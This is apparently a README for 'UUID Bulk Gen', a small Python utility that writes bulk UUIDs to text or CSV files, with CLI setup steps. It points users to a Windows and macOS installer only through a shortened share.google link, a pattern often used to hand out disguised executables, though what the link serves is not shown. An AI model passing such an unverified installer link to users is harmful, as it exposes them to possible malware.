![UUID Bulk Gen](assets/hero.png)

# UUID Bulk Gen

*A local UUID list for fixtures and tokens.*

## About

**UUID Bulk Gen** is a developer utility. Generate a list of UUIDs and write them to a text or CSV file.

Online UUID pages are fine for one id. Tests need a thousand.

Meant for a local repo or a config file on disk. No hosted workspace.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Count and output path
- Text or CSV
- Optional prefix
- No network

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/laura-8884/uuid-bulk-gen

MIT license. See `LICENSE`.
